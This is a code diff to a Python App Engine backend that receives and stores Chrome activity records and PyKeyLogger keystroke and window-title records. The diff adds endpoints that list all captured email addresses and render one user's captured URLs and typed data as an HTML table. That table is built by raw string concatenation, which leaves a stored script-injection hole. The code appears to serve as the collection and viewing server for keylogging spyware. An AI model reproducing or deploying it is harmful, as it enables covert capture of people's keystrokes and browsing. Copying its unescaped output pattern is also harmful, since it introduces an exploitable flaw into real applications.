@@ -16,22 +16,23 @@ JINJA_ENVIRONMENT = jinja2.Environment(
     extensions=['jinja2.ext.autoescape'],
     autoescape=True)
 
+## Define a key for chrome Entity
 NAME = "chrome_data"
-
 def browser_key(browser_name = NAME):
     return ndb.Key('Browser',browser_name)
 
-# Chrome entity having email, eventType, urlLink, data and timeStamp as properties.
+## Define email, eventType, urlLink, data and timeStamp as properties of Chrome Entity.
 class Chrome(ndb.Model):
+    # Email id is a key
     email = ndb.StringProperty(indexed = True)
     eventType = ndb.StringProperty(indexed = False)
     urlLink = ndb.StringProperty(indexed = False)
     datas = ndb.StringProperty(indexed = False)
     timeStamp = ndb.StringProperty(indexed = False)
 
-# Getting chrome data and storing in the database.
+## Getting chrome data and storing in the database.
 class ChromeData(webapp2.RequestHandler):
-    def post(self):   
+    def post(self):
         mail = self.request.get("email")
         event_type = self.request.get("eventType")
         url_link = self.request.get("urlLink")
@@ -54,6 +55,8 @@ class ChromeData(webapp2.RequestHandler):
 def pyKeyLogger_key(logger_name = "pyKey"):
     return ndb.Key('PyKey',logger_name)
 
+## Define userName, loggeduser, windowtitle, datas and timeStamp as properties of
+## PyKeyLogger Entity.
 class PyKeyLogger(ndb.Model):
     userName = ndb.StringProperty(indexed = True)
     loggeduser = ndb.StringProperty(indexed = False)
@@ -107,28 +110,59 @@ class getChrome(webapp2.RequestHandler):
         template_values = {}
         template = JINJA_ENVIRONMENT.get_template('sample.html')
         self.response.write(template.render(template_values))
-       # mail = self.request.get("email")
-##        chromedata = self.request.get('browser_name',"chrome_data")
-##        qry = Chrome.query(ancestor = browser_key(chromedata))
-##        data_query = qry.filter(Chrome.email == mail)
-##        dataa = data_query.fetch()
-##        global result
-##        result = []
-##        for row in dataa:
-##            temp = {}
-##            temp['evenType'] = row.eventType
-##            temp['urlLink'] = row.urlLink
-##            temp['datas'] = row.datas
-##            temp['timeStamp'] = row.timeStamp
-##            temp['email'] = row.email
-##            result.append(temp)
-##        chrome_data= {'data':result}
-##        self.response.write(json.dumps(chrome_data))
-        #self.response.write(mail)
+
+HTML = """\
+<html>
+  <body>
+    <div>
+        <table>
+            <tr><th>TimeStamp</th><th>eventType</th><th>url</th><th>data</th></tr>
+        
+"""
 class GetMail(webapp2.RequestHandler):
     def post(self):
         mail = self.request.get("email")
-        self.response.write(mail)
+        chromedata = self.request.get('browser_name',"chrome_data")
+        qry = Chrome.query(ancestor = browser_key(chromedata))
+        data_query = qry.filter(Chrome.email == mail)
+        dataa = data_query.fetch()
+        global result
+        result = []
+        global HTML
+        HTML = """\
+        <html>
+          <body border=\"1\" style=\"width:100%\">
+            <div>
+            <table>
+            <tr><th>TimeStamp</th><th>eventType</th><th>url</th><th>data</th></tr>
+        
+        """
+        for row in dataa:
+            temp = {}
+            temp['evenType'] = row.eventType
+            temp['urlLink'] = row.urlLink
+            temp['datas'] = row.datas
+            temp['timeStamp'] = row.timeStamp
+            temp['email'] = row.email
+            result.append(temp)
+            HTML = HTML+"<tr><td>"+row.timeStamp+"</td><td>"+row.eventType+"</td><td>"+row.urlLink+"</td><td>"+row.datas+"</td></tr>"
+        HTML = HTML+"</table></div></body></html>"
+        chrome_data= {'data':result}
+        self.response.write(HTML)
+        #self.response.write(mail)
+class GetUsers(webapp2.RequestHandler):
+    def post(self):
+        chromedata = self.request.get('browser_name',"chrome_data")
+        qry = Chrome.query(ancestor = browser_key(chromedata))
+        #data_query = qry.filter(Chrome.email == mail)
+        dataa = qry.fetch()
+        global resu
+        resu = []
+        for row in dataa:
+            if row.email not in resu and '@' in row.email:
+                resu.append(row.email)
+        user_list = {'users':resu}
+        self.response.write(json.dumps(user_list))
 app = webapp2.WSGIApplication([
     ('/', MainPage),
     ('/chrome',ChromeData),
@@ -136,5 +170,5 @@ app = webapp2.WSGIApplication([
     ('/getpydata',getPyData),
     ('/getchromedata',getChrome),
     ('/getMail',GetMail),
+    ('/getusers',GetUsers),
 ], debug=True)
-
